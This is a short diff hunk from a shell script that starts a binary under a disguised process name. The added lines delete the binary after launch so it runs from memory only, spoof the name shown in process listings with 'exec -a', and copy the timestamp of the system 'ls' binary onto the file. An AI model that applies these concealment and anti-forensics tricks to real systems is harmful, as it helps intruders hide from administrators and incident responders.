@@ -54,9 +54,14 @@ case $method in
         ln $binary $disguise
 	# run it with current dir as PATH so just process name in ps list
 	env PATH=$PATH:. $disguise &
+	# remove the binary leaving it running in memory only
+        rm $disguise
 	;;
     1) 
-	exec ./$disguise &
+	# run the binary in the background with a disguised name in the process list
+	exec -a $disguise $binary &
+	# change the timestamp on the binary to the time of the local ls command binary
+	touch $binary -r $(which ls)
 	;;
     2) 
 	#fork
